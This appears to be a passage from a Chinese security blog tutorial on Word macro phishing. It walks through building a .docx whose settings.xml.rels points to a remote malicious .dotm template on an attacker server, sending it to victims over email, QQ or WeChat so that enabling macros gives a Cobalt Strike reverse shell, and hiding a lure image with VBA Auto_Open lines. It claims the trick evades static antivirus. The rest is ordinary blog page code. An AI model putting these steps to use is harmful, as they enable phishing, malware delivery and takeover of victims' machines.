+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646721514872-634b0fee-f354-4d79-90a7-7b9fd54fc0f3.png" alt="img"></p>
+<h2 id="2、构造恶意的docx钓鱼文件"><a href="#2、构造恶意的docx钓鱼文件" class="headerlink" title="2、构造恶意的docx钓鱼文件"></a>2、构造恶意的docx钓鱼文件</h2><p>打开word找一个任意的模板使用</p>
+<p>这里我就通过录制宏，另存为<code>1.dotm</code>模板文件到Office模板目录下，自己制作一个模板</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646719903313-43ccfbd5-7979-4b6d-9747-7390331b50ed.gif" alt="img"></p>
+<p>直接继续在开始一栏新建–导入之前做好的模板文件<code>1.dotm</code>，保存为<code>嘿嘿.docx</code></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646720328145-40ed0a52-385b-4dd5-b4ae-2aac443ec60c.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646720446925-83d40337-ef2f-49ab-89ae-0deddd9e2c98.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646720700246-75e7c0c6-6f9b-4dfb-a696-2121e555d038.png" alt="img"></p>
+<p>将后缀名改为zip</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646720729291-7043c46d-3e0e-44f3-82f3-ba13d7fcb37c.png" alt="img"></p>
+<p>解压缩</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646720760370-02a49df4-a832-41cb-a192-6878e8e5a480.png" alt="img"></p>
+<p>进入word文件夹中的_rels，找到settings.xml.rels文件，编辑这个文件，将其的target属性的值改为服务器的URL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:port/获奖名单.dotm?raw=true</span><br><span class="line">或者</span><br><span class="line">http://域名/获奖名单.dotm?raw=true</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646721473793-ca525925-718d-4751-bc50-68dd1d429609.png" alt="img"></p>
+<p>完成后，将刚才解压生成的文件再压缩回去</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646721075677-c3e94461-360b-4b80-bcd0-f372c9d878be.png" alt="img"></p>
+<p>并且将生成的文件改名为后缀名为docx的文件</p>
+<blockquote>
+<p>这里利用的是分离免杀的方法，里面的代码都是正常的，由于杀毒软件是静态查杀，所以无法查杀的！</p>
+</blockquote>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220308152515498.png" alt="image-20220308152515498"></p>
+<h2 id="3、加载服务器上的恶意文件反弹shell"><a href="#3、加载服务器上的恶意文件反弹shell" class="headerlink" title="3、加载服务器上的恶意文件反弹shell"></a>3、加载服务器上的恶意文件反弹shell</h2><p>将最终生成的恶意文件——<code>嘿嘿.docx</code>用邮箱钓鱼、qq或微信文件发送给受害者，当受害者双击打开“<code>嘿嘿.docx</code>”文件，启用宏时，恶意代码会执行，目标主机会上线</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646721902197-e4175949-3ede-4df3-8d40-d5e42253cb03.gif" alt="img"></p>
+<h2 id="4、进阶伪装–背景虚拟化图片的覆盖"><a href="#4、进阶伪装–背景虚拟化图片的覆盖" class="headerlink" title="4、进阶伪装–背景虚拟化图片的覆盖"></a>4、进阶伪装–背景虚拟化图片的覆盖</h2><p>从刚刚的实验可以知道，启动word后，还需要用户点击启用宏，稍有戒备心的就不会开启，因此我们需要再做一些钓鱼工作</p>
+<p>以下内容来自公众号Gamma实验室的内容，链接已在参考链接给出。暂时不对此进行复现，了解有这种骚操作即可。</p>
+<p>在网上随便找个模板，复制黏贴进去，截图另存为</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723329642-1eb38009-8c6b-4678-bbd1-1edecba0903d.png" alt="img"></p>
+<p>打开我们的神器，美图秀秀，打开我们刚截图的图片，点击背景虚拟化，调整虚拟化程度，最好是那种弱影弱现的感觉最nice，然后加上一些说明嗷</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723357498-4b434db3-f848-4dbf-b4f3-14ba41f75357.png" alt="img"></p>
+<p>然后设置图片尺寸为790，1120</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723381555-7944c159-7bad-4332-a6e6-8046704566d4.png" alt="img"></p>
+<p>然后保存，然后就可以看到效果了</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723403051-01f3d6d2-4eca-4499-b812-73854cfb372b.png" alt="img"></p>
+<p>为什么会设置成790x1120嘞，只是为了刚好覆盖word里面的文本，然后docx文档另存为doc文档</p>
+<p>然后打开，去开启显示开发者工具选项卡，文件-&gt;选项-&gt;自定义功能区-&gt;主选项卡-&gt;开发者工具</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723434615-5f00d1e4-2a2a-4ba2-b124-0543e068b863.png" alt="img"></p>
+<p>然后点击开发者工具，选择图像（Active控件）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723482821-f0c2e5e2-79b8-416d-ba23-0b24e7b01a41.png" alt="img"></p>
+<p>设置图像格式为浮于文字上方，并把图像拉满</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723501481-bb0a30e8-e538-441d-8ee4-06aa6de9780e.png" alt="img"></p>
+<p>效果就是这样，会把文字全部覆盖</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723527417-f2bd4752-3415-4e80-b170-983deb0a7a14.png" alt="img"></p>
+<p>然后点击图像属性，设置成我们做好的图片，然后点击宏创建宏，cs生成宏木马</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723557340-0b817587-6264-4c06-a57b-bc4b4804cb5a.png" alt="img"></p>
+<p>复制粘贴，在Auto_Open（）函数首部编写代码，设置图片位置为0高度为0让宏运行后doc上图片消失，然后保存，office马就制作好了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Project.ThisDocument.Image1.Top = 0</span><br><span class="line">Project.ThisDocument.Image1.Width = 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723598308-c7b783ce-0e1f-4059-9b4e-04953f15cf7f.png" alt="img"></p>
+<p>成品展示：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723624238-1fcb9911-48c3-4926-988c-45644726d0d6.png" alt="img"></p>
+<h1 id="三、其他思路"><a href="#三、其他思路" class="headerlink" title="三、其他思路"></a>三、其他思路</h1><p>如果是遇到WPS的客户怎么办？通过上面的方法WPS打开我的简历是不会提示宏的</p>
+<p>其他思路：</p>
+<ol>
+<li>打开WPS创建宏是暗色的需要安装VBA for WPS才可以写WPS宏病毒代码执行！</li>
+<li>Office和WPS中还可以隐藏文字，可以利用该方式通过配合录制宏的方法，用该方式执行…</li>
+<li>Normal模块下，不止能编写一个settings.xml.rels…可以多宏…</li>
+<li>弹框执行代码写入宏，那么Excel、PPT等也写…</li>
+<li>不止docx宏，还有很多，能另存文件内容的都可以…</li>
+</ol>
+<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/14435769.html">https://www.cnblogs.com/zzjdbk/p/14435769.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34801745/article/details/111307768">https://blog.csdn.net/qq_34801745/article/details/111307768</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1799424">https://cloud.tencent.com/developer/article/1799424</a></p>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">w01ke</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://wolke.cn/post/42739bea.html">https://wolke.cn/post/42739bea.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wolke.cn" target="_blank">wolke</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CobaltStrike/">CobaltStrike</a><a class="post-meta__tags" href="/tags/%E9%92%93%E9%B1%BC/">钓鱼</a><a class="post-meta__tags" href="/tags/%E7%A4%BE%E5%B7%A5/">社工</a><a class="post-meta__tags" href="/tags/APT/">APT</a></div><div class="post_share"><div class="social-share" data-image="/img/messageboard.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/5653cc29.html"><img class="next-cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220307183914737.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">RLO的Unicode反转文件后缀钓鱼</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/5653cc29.html" title="RLO的Unicode反转文件后缀钓鱼"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220307183914737.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-07</div><div class="title">RLO的Unicode反转文件后缀钓鱼</div></div></a></div><div><a href="/post/1cb9d074.html" title="lnk快捷方式钓鱼"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/img_49285.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-28</div><div class="title">lnk快捷方式钓鱼</div></div></a></div><div><a href="/post/5cb87fce.html" title="Excel宏钓鱼"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/Microsoft-Excel.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-21</div><div class="title">Excel宏钓鱼</div></div></a></div><div><a href="/post/57d03e3e.html" title="CobaltStrike安装及基本使用与内网渗透"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-17</div><div class="title">CobaltStrike安装及基本使用与内网渗透</div></div></a></div><div><a href="/post/bce31dbc.html" title="强制加好友并给他打QQ电话"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220104181750783.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-04</div><div class="title">强制加好友并给他打QQ电话</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%9C%AC%E5%9C%B0%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8FWord%E6%96%87%E6%A1%A3-%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6%E4%B8%8A%E7%BA%BFCS"><span class="toc-text">一、本地加载恶意Word文档&#x2F;模板文件上线CS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%94%9F%E6%88%90%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-text">1、生成监听器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8CobaltStrike%E7%94%9F%E6%88%90%E5%AE%8F%E6%9C%A8%E9%A9%AC"><span class="toc-text">2、使用CobaltStrike生成宏木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%88%9B%E5%BB%BA%E5%90%AF%E7%94%A8%E6%81%B6%E6%84%8F%E5%AE%8F%E7%9A%84Word%E6%96%87%E6%A1%A3-%E6%A8%A1%E6%9D%BF"><span class="toc-text">3、创建启用恶意宏的Word文档&#x2F;模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E5%AE%8F%E6%96%87%E4%BB%B6"><span class="toc-text">4、加载恶意宏文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8FWord%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0CS"><span class="toc-text">二、远程加载恶意Word模板文件上传CS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%B0%86%E6%81%B6%E6%84%8F%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">1、将恶意模板文件上传到服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E7%9A%84docx%E9%92%93%E9%B1%BC%E6%96%87%E4%BB%B6"><span class="toc-text">2、构造恶意的docx钓鱼文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%8A%A0%E8%BD%BD%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">3、加载服务器上的恶意文件反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E8%BF%9B%E9%98%B6%E4%BC%AA%E8%A3%85%E2%80%93%E8%83%8C%E6%99%AF%E8%99%9A%E6%8B%9F%E5%8C%96%E5%9B%BE%E7%89%87%E7%9A%84%E8%A6%86%E7%9B%96"><span class="toc-text">4、进阶伪装–背景虚拟化图片的覆盖</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%85%B6%E4%BB%96%E6%80%9D%E8%B7%AF"><span class="toc-text">三、其他思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">四、参考链接</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By w01ke</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><script type="text/javascript">document.write(unescape("%3Cspan id='cnzz_stat_icon_1280658241'%3E%3C/span%3E%3Cscript src='https://s9.cnzz.com/z_stat.php%3Fid%3D1280658241%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script></div><div class="icp"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><img class="icp-icon" src="/img/gongan.png"/><span>赣ICP备2021004623号-1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'MynqQPDIzA7sk9p7dF7E8vPi-gzGzoHsz',
+      appKey: 'nQR603PJj8t2qUQiGTSeqXrB',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: {
+          "Heybox2": "Heybox/expression_cube_bingbujiandan.png",
+          "Heybox6": "Heybox/expression_cube_doge.png",
+          "Heybox7": "Heybox/expression_cube_gandong.png",
+          "Heybox8": "Heybox/expression_cube_guai.png",
+          "Heybox9": "Heybox/expression_cube_gugu.png",
+          "Heybox10": "Heybox/expression_cube_han.png",
+          "Heybox13": "Heybox/expression_cube_huaji.png",
+          "Heybox19": "Heybox/expression_cube_kuqi.png",
+          "Heybox20": "Heybox/expression_cube_nu.png",
+          "Heybox21": "Heybox/expression_cube_penshui.png",
+          "Heybox22": "Heybox/expression_cube_qiliang.png",
+          "Heybox23": "Heybox/expression_cube_shengqi.png",
+          "Heybox28": "Heybox/expression_cube_wa.png",
+          "Heybox29": "Heybox/expression_cube_weiqu.png",
+          "Heybox38": "Heybox/expression_heyboxgirl.png",
+          "Heybox41": "Heybox/expression_heygirl_aidao.png",
+          "Heybox42": "Heybox/expression_heygirl_baipiaoguai.png",
+          "Heybox43": "Heybox/expression_heygirl_chi.png",
+          "Heybox44": "Heybox/expression_heygirl_chigua.png",
+          "Heybox46": "Heybox/expression_heygirl_haha.png",
+          "Heybox46": "Heybox/expression_heygirl_haha.png",
+          "Heybox47": "Heybox/expression_heygirl_haixiu.png",
+          "Heybox48": "Heybox/expression_heygirl_henaicha.png",
+          "Heybox49": "Heybox/expression_heygirl_huaji.png",
+          "Heybox50": "Heybox/expression_heygirl_jing.png",
+          "Heybox51": "Heybox/expression_heygirl_jixialai.png",
+          "Heybox52": "Heybox/expression_heygirl_kaikele.png",
+          "Heybox53": "Heybox/expression_heygirl_ku.png",
+          "Heybox54": "Heybox/expression_heygirl_kujiuruhou.png",
+          "Heybox55": "Heybox/expression_heygirl_nielian.png",
+          "Heybox56": "Heybox/expression_heygirl_qiaokaixin.png",
+          "Heybox58": "Heybox/expression_heygirl_rua.png",
+          "Heybox59": "Heybox/expression_heygirl_toukan.png",
+          "Heybox60": "Heybox/expression_heygirl_tu.png",
+          "Heybox61": "Heybox/expression_heygirl_wuyu.png",
+          "Heybox62": "Heybox/expression_heygirl_xihuan.png",
+          "Heybox63": "Heybox/expression_heygirl_yiwen.png",
+          "Heybox64": "Heybox/expression_heygirl_zhe.png",
+          "Heybox65": "Heybox/expression_heziji_1.png",
+          "Heybox66": "Heybox/expression_heziji_10.png",
+          "Heybox67": "Heybox/expression_heziji_11.png",
+          "Heybox68": "Heybox/expression_heziji_12.png",
+          "Heybox70": "Heybox/expression_heziji_14.png",
+          "Heybox71": "Heybox/expression_heziji_15.png",
+          "Heybox77": "Heybox/expression_heziji_20.png",
+          "Heybox78": "Heybox/expression_heziji_21.png",
+          "Heybox79": "Heybox/expression_heziji_22.png",
+          "Heybox80": "Heybox/expression_heziji_23.png",
+          "Heybox87": "Heybox/expression_heziji_3.png",
+          "Heybox88": "Heybox/expression_heziji_30.png",
+          "Heybox89": "Heybox/expression_heziji_31.png",
+          "HONKAI3-Daily1": "HONKAI3-Daily/1.gif",
+          "HONKAI3-Daily2": "HONKAI3-Daily/10.gif",
+          "HONKAI3-Daily3": "HONKAI3-Daily/11.gif",
+          "HONKAI3-Daily4": "HONKAI3-Daily/12.gif",
+          "HONKAI3-Daily5": "HONKAI3-Daily/13.gif",
+          "HONKAI3-Daily6": "HONKAI3-Daily/14.gif",
+          "HONKAI3-Daily7": "HONKAI3-Daily/15.gif",
+          "HONKAI3-Daily8": "HONKAI3-Daily/16.gif",
+          "HONKAI3-Daily9": "HONKAI3-Daily/2.gif",
+          "HONKAI3-Daily10": "HONKAI3-Daily/3.gif",
+          "HONKAI3-Daily11": "HONKAI3-Daily/4.gif",
+          "HONKAI3-Daily12": "HONKAI3-Daily/5.gif",
+          "HONKAI3-Daily13": "HONKAI3-Daily/6.gif",
+          "HONKAI3-Daily14": "HONKAI3-Daily/7.gif",
+          "HONKAI3-Daily15": "HONKAI3-Daily/8.gif",
+          "HONKAI3-Daily16": "HONKAI3-Daily/9.gif",
+          "HONKAI3-Star1": "HONKAI3-Star/1.gif",
+          "HONKAI3-Star2": "HONKAI3-Star/10.gif",
+          "HONKAI3-Star3": "HONKAI3-Star/11.gif",
+          "HONKAI3-Star4": "HONKAI3-Star/12.gif",
+          "HONKAI3-Star5": "HONKAI3-Star/13.gif",
+          "HONKAI3-Star6": "HONKAI3-Star/14.gif",
+          "HONKAI3-Star7": "HONKAI3-Star/15.gif",
+          "HONKAI3-Star8": "HONKAI3-Star/16.gif",
+          "HONKAI3-Star9": "HONKAI3-Star/2.gif",
+          "HONKAI3-Star10": "HONKAI3-Star/3.gif",
+          "HONKAI3-Star11": "HONKAI3-Star/4.gif",
+          "HONKAI3-Star12": "HONKAI3-Star/5.gif",
+          "HONKAI3-Star13": "HONKAI3-Star/6.gif",
+          "HONKAI3-Star14": "HONKAI3-Star/7.gif",
+          "HONKAI3-Star15": "HONKAI3-Star/8.gif",
+          "HONKAI3-Star16": "HONKAI3-Star/9.gif"
+      },
+      path: window.location.pathname,
+      placeholder: '',
+      pageSize: '',
+      lang: 'zh-CN',
+      recordIP: true,
+      emojiCDN: 'https://valinecdn.bili33.top/',
+      enableQQ: true,
+      tagMeta: ["UP","Buddy","Visitor"],
+      master: '1e45134c2d9e333e8889556513f09903',
+      friends: ['5029a42d22ca4d65e16cf3fdd9654ffe'],
+      requiredFields: ['nick','mail'],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.17.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=monsterid'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = () => {
+    const serverURL = 'https://MynqQPDI.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": 'MynqQPDIzA7sk9p7dF7E8vPi-gzGzoHsz',
+        "X-LC-Key": 'nQR603PJj8t2qUQiGTSeqXrB',
+        "Content-Type": "application/json"
+      },
+    }
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.innerHTML= "无法获取评论，请确认相关配置是否正确"
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script src="//lib.baomitu.com/jquery/3.3.1/jquery.min.js"></script><script src="https://myhkw.cn/api/player/1641175681147" id="myhk" key="1641175681147" m="1"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐" data-fontsize="15px" data-random="false" async="async"></script><script>(function(d, w, c) {
+    w.ChatraID = 'EqStaz8vFN6KYhHzY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
